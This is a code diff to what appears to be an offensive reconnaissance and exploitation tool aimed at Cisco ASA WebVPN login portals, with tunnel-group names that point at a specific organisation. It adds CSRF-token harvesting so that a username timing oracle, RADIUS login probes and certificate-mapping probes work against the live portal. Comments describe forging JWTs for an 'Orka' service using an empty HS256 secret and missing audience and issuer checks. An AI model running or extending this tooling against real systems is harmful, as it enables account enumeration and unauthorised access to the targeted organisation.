@@ -115,6 +115,84 @@ def _raw_tls_send(host, port, payload: bytes, timeout=10) -> bytes:
         return b''
 
 
+def _get_logon_csrf(host: str, port: int = 443, timeout: int = 10) -> dict:
+    """
+    GET /+CSCOE+/logon.html and extract CSRF double-submit tokens.
+
+    ASA WebVPN CSRF mechanism (double-submit cookie pattern):
+      1. Server embeds csrf_token in hidden form field
+      2. Inline JS: document.cookie = "CSRFtoken=" + same_value
+      3. POST must include both: form field AND CSRFtoken cookie (same value)
+      4. Server validates form_field == cookie — no server-side state needed
+
+    Returns dict with keys:
+      csrf_token  — value for form field 'csrf_token' (= CSRFtoken cookie)
+      cookies     — dict ready to pass as POST Cookie header
+      error       — None on success, string on failure
+    """
+    import http.client, time
+
+    ctx = _make_ctx()
+    try:
+        conn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout)
+        conn.request('GET', '/+CSCOE+/logon.html', headers={
+            'Host': host,
+            'User-Agent': 'Mozilla/5.0 (compatible; AnyConnect/4.10)',
+            'Accept': 'text/html',
+            'Connection': 'keep-alive',
+        })
+        r = conn.getresponse()
+        body = r.read().decode('utf-8', errors='replace')
+
+        # Parse live cookies (skip expired ones)
+        live_cookies = {}
+        for h, v in r.getheaders():
+            if h.lower() != 'set-cookie':
+                continue
+            parts = [p.strip() for p in v.split(';')]
+            name, _, val = parts[0].partition('=')
+            attrs = {}
+            for p in parts[1:]:
+                if '=' in p:
+                    k, _, kv = p.partition('=')
+                    attrs[k.strip().lower()] = kv.strip()
+                else:
+                    attrs[p.strip().lower()] = True
+            expired = False
+            if 'expires' in attrs:
+                try:
+                    from email.utils import parsedate_to_datetime
+                    if parsedate_to_datetime(attrs['expires']).timestamp() < time.time():
+                        expired = True
+                except Exception:
+                    pass
+            if not expired and val:
+                live_cookies[name.strip()] = val
+
+        # Extract form csrf_token
+        form_m = re.search(r'name="csrf_token"[^>]+value="([^"]+)"', body)
+        if not form_m:
+            form_m = re.search(r'csrf_token[^>]+value="([a-f0-9]{20,})"', body)
+
+        # Extract JS CSRFtoken cookie value
+        js_m = re.search(r'"CSRFtoken="\s*\+\s*"([a-f0-9]+)"', body)
+
+        csrf_token = (form_m or js_m)
+        if csrf_token:
+            csrf_token = csrf_token.group(1)
+        else:
+            csrf_token = ''
+
+        cookies = dict(live_cookies)
+        if csrf_token:
+            cookies['CSRFtoken'] = csrf_token
+
+        conn.close()
+        return {'csrf_token': csrf_token, 'cookies': cookies, 'error': None, '_conn': None}
+    except Exception as e:
+        return {'csrf_token': '', 'cookies': {}, 'error': str(e), '_conn': None}
+
+
 # ---------------------------------------------------------------------------
 # Module: HostScan/CSD gate analysis
 # ---------------------------------------------------------------------------
@@ -893,16 +971,29 @@ class UsernameTimingOracleRE:
 
     def probe_user(self, username: str, tunnel_group: str = '') -> dict:
         import time
-        body_parts = [f'username={username}', 'password=INVALID_PROBE_ONLY', 'Login=Login']
+        sess = _get_logon_csrf(self.host, self.port)
+        body_parts = [
+            f'username={urllib.parse.quote(username)}',
+            'password=INVALID_PROBE_ONLY',
+            'Login=Login',
+            f'csrf_token={sess["csrf_token"]}',
+            'tgcookieset=', 'next=', 'tgroup=',
+        ]
         if tunnel_group:
-            body_parts.append(f'tg_name={tunnel_group}')
+            body_parts.append(f'tg_name={urllib.parse.quote(tunnel_group)}')
         body = '&'.join(body_parts)
+        cookie_hdr = '; '.join(f'{k}={v}' for k, v in sess['cookies'].items())
         start = time.monotonic()
         r = _fetch(
             self.host, self.port, '/+webvpn+/index.html',
             method='POST',
             body=body.encode(),
-            headers={'Content-Type': 'application/x-www-form-urlencoded'},
+            headers={
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Cookie': cookie_hdr,
+                'Referer': f'https://{self.host}:{self.port}/+CSCOE+/logon.html',
+                'Origin': f'https://{self.host}',
+            },
         )
         elapsed = time.monotonic() - start
         resp_body = r.get('body', '')
@@ -1125,13 +1216,22 @@ class RADIUSClassAttrRE:
         results = []
         import time
         for user, passwd in test_cases:
-            body = f'username={user}&password={passwd}&Login=Login'
+            sess = _get_logon_csrf(self.host, self.port)
+            body = urllib.parse.urlencode({
+                'username': user, 'password': passwd, 'Login': 'Login',
+                'csrf_token': sess['csrf_token'], 'tgcookieset': '', 'next': '', 'tgroup': '',
+            })
+            cookie_hdr = '; '.join(f'{k}={v}' for k, v in sess['cookies'].items())
             t0 = time.monotonic()
             r = _fetch(
                 self.host, self.port, '/+webvpn+/index.html',
                 method='POST',
                 body=body.encode(),
-                headers={'Content-Type': 'application/x-www-form-urlencoded'},
+                headers={
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Cookie': cookie_hdr,
+                    'Referer': f'https://{self.host}:{self.port}/+CSCOE+/logon.html',
+                },
             )
             elapsed = time.monotonic() - t0
             a0_m = re.search(r'a0\s*=\s*["\']?(\d+)["\']?', r.get('body', ''))
@@ -1149,13 +1249,21 @@ class RADIUSClassAttrRE:
         Attempt to connect to DefaultWEBVPNGroup without specifying tg_name.
         Book: if no tg_name sent, user goes to DefaultWEBVPNGroup regardless of RADIUS class attr.
         """
-        # No tg_name → DefaultWEBVPNGroup
-        body = 'username=testuser&password=INVALID&Login=Login'
+        sess = _get_logon_csrf(self.host, self.port)
+        body = urllib.parse.urlencode({
+            'username': 'testuser', 'password': 'INVALID', 'Login': 'Login',
+            'csrf_token': sess['csrf_token'], 'tgcookieset': '', 'next': '', 'tgroup': '',
+        })
+        cookie_hdr = '; '.join(f'{k}={v}' for k, v in sess['cookies'].items())
         r = _fetch(
             self.host, self.port, '/+webvpn+/index.html',
             method='POST',
             body=body.encode(),
-            headers={'Content-Type': 'application/x-www-form-urlencoded'},
+            headers={
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Cookie': cookie_hdr,
+                'Referer': f'https://{self.host}:{self.port}/+CSCOE+/logon.html',
+            },
         )
         a0_m = re.search(r'a0\s*=\s*["\']?(\d+)["\']?', r.get('body', ''))
         return {
@@ -1417,13 +1525,27 @@ class OrkaJWTRE:
         # 0x1844ae5: ret — return flipped(required)
         # NET: required=false(0) → flipped=1=true → VerifyAudience passes (bypass!)
         # DEEPER FINDING (confirmed via MapClaims.Valid disassembly 0x1844fe0):
+        # Full call graph of MapClaims.Valid() from objdump (2026-08-13):
+        #   0x1845000: call runtime.newobject       — alloc ValidationError
+        #   0x1845014: call *(rdx)                  — TimeFunc() → current time
+        #   0x184504d: call VerifyExpiresAt(0x1844b60, required=false) → sets 0x10 on fail
+        #   0x18450b3: call VerifyIssuedAt(0x1844c80, required=false)  → sets 0x20 on fail
+        #   0x1845116: call VerifyNotBefore(0x1844ec0, required=false) → sets 0x80 on fail
+        #   0x1845177: cmp error.flags, 0   → if nonzero, return ValidationError
+        #   0x1845186: ret nil (success)
+        # VerifyAudience (0x1844a40) NOT CALLED. VerifyIssuer (0x1844da0) NOT CALLED.
         # MapClaims.Valid() NEVER calls VerifyAudience — it only calls:
         #   VerifyExpiresAt (0x1844b60, required=false)
         #   VerifyIssuedAt  (0x1844c80, required=false)
         #   VerifyNotBefore (0x1844ec0, required=false)
         # → Audience check is COMPLETELY ABSENT from standard JWT validation flow.
+        # → Issuer check is COMPLETELY ABSENT — iss claim never verified.
         # → CVE-2020-26160 only matters if caller explicitly calls VerifyAudience.
-        # → Real bypass: empty secret HS256 + no aud check in Valid() = full token forge.
+        # → Real bypass: empty secret HS256 + no aud/iss check in Valid() = full token forge.
+        # Token requirements for Valid() to return nil:
+        #   exp > now  (or absent: VerifyExpiresAt with required=false passes on absent claim)
+        #   iat <= now (or absent)
+        #   nbf <= now (or absent)
         'condition':   'aud claim absent in token AND required=false in call',
         'impact':      'audience check bypassed → accept tokens without aud validation',
         'exploit': {
@@ -1914,31 +2036,22 @@ class CertMapRE:
         Probe different tunnel group + cert scenarios to map error response variants.
         Target: distinguish "cert required" vs "cert presented + cert invalid for group".
         """
-        import time, http.cookiejar
+        import time
 
         results = []
         tunnel_groups = ['', 'Cisco AnyConnect VPN', 'MacStadium-SSO-VPN', 'MacStadium-VPN',
                          'DefaultWEBVPNGroup', 'DefaultRAGroup']
 
         for tg in tunnel_groups:
-            cj = http.cookiejar.CookieJar()
-            opener = urllib.request.build_opener(
-                urllib.request.HTTPSHandler(context=_make_ctx()),
-                urllib.request.HTTPCookieProcessor(cj),
-            )
-            # GET logon to get session cookie
-            init_req = urllib.request.Request(f'https://{self.host}:{self.port}/+CSCOE+/logon.html',
-                headers={'User-Agent': 'AnyConnect/4.10'})
-            try:
-                with opener.open(init_req, timeout=8) as r:
-                    r.read()
-            except Exception:
-                pass
-
-            body_parts = ['username=testcertuser', 'password=PROBE', 'Login=Login']
+            sess = _get_logon_csrf(self.host, self.port)
+            cookie_hdr = '; '.join(f'{k}={v}' for k, v in sess['cookies'].items())
+            params = {
+                'username': 'testcertuser', 'password': 'PROBE', 'Login': 'Login',
+                'csrf_token': sess['csrf_token'], 'tgcookieset': '', 'next': '', 'tgroup': '',
+            }
             if tg:
-                body_parts.append(f'tgroup={urllib.parse.quote(tg)}')
-            body = '&'.join(body_parts)
+                params['tg_name'] = tg
+            body = urllib.parse.urlencode(params)
 
             t0 = time.monotonic()
             try:
@@ -1946,11 +2059,15 @@ class CertMapRE:
                     f'https://{self.host}:{self.port}/+webvpn+/index.html',
                     data=body.encode(),
                     method='POST',
-                    headers={'Content-Type': 'application/x-www-form-urlencoded',
-                             'User-Agent': 'AnyConnect/4.10'},
+                    headers={
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                        'User-Agent': 'AnyConnect/4.10',
+                        'Cookie': cookie_hdr,
+                        'Referer': f'https://{self.host}:{self.port}/+CSCOE+/logon.html',
+                    },
                 )
                 try:
-                    with opener.open(post_req, timeout=10) as r:
+                    with urllib.request.urlopen(post_req, context=_make_ctx(), timeout=10) as r:
                         resp_body = r.read().decode('utf-8', errors='replace')
                 except urllib.error.HTTPError as e:
                     resp_body = e.read().decode('utf-8', errors='replace')
